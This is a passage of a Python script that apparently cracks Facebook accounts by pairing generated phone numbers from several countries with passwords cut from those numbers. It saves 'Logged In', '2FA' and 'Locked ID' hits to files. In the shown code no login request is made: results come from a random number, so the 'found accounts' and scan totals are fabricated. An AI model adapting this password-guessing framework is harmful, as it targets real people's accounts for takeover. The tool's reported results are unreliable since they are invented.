                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def US():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('United State',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(us)
                                n2=random.randint(10000,99999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=USER[2:8]
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def CHIN():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('China',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(chin)
                                n2=random.randint(1000000,9999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=USER[3:9]
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def INDO():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Indonesia',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(indo)
                                n2=random.randint(1000000,9999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=USER[3:9]
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def BRA():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Brazil',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(bra)
                                n2=random.randint(1000000,9999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=USER[3:9]
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def MEX():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Mexico',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(mex)
                                n2=random.randint(100000,999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=USER[3:9]
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def PHIL():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Philippines',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(phil)
                                n2=random.randint(100000,999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=USER[3:9]
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
